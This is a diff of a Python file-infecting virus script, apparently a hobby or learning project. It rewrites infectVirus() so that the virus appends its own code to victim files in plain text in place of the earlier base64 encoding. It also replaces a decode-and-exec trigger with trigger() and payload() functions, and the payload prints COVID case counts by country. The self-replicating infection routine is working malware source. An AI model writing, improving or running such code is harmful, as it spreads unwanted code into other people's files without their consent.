@@ -17,8 +17,8 @@ def infectVirus():
     victims.remove(sys.argv[0])
     for victim in victims:
         fileHandler = open(victim,"r")
-        programCode = fileHandler.read()
-        decrypedCode = base64.b64decode(programCode)
+        programCode = fileHandler.readlines()
+        #decrypedCode = base64.b64decode(programCode)
         fileHandler.close()
         infected = False
         for line in programCode:
@@ -27,25 +27,20 @@ def infectVirus():
                 break
         
         if not infected:
-            #newCode = []
-            encodedCode = []
-            #newCode.extend(programCode)
-            codeBytes = getVirusCode().encode('utf-8')
-            encodedCode = base64.b64encode(codeBytes)
-            #newCode.extend(encodedCode)
+            newCode = []
+            newCode.extend(programCode)
+            #codeBytes = getVirusCode().encode('utf-8')
+            #encodedCode = base64.b64encode(codeBytes)
+            newCode.extend(getVirusCode())
             
             fileHandler = open(victim,"w")
-            fileHandler.write(encodedCode.decode('utf-8'))
+            #fileHandler.write(encodedCode.decode('utf-8'))
+            fileHandler.writelines(newCode)
             fileHandler.close() 
 
-infectVirus()
 ### TRIGGER ###
-victims = find_victims()
-victims.remove(sys.argv[0])
-for victim in victims:
-    encryptedFile = open(victim,"r").read()
-    decryptedFile = base64.b64decode(encryptedFile)
-    exec(decryptedFile)
+def trigger():
+    payload()
 
 ### PAYLOAD ###
 def getCovidINFO():
@@ -56,6 +51,11 @@ def getCovidINFO():
         print(locations[i]['country'] + " " + str(locations[i]['latest']['confirmed']))
         i+=1
 
-getCovidINFO()
+def payload():
+    getCovidINFO()
 
 ### -_- VIRUS END -_- ###
+
+if __name__ == "__main__":
+    infectVirus()
+    trigger()
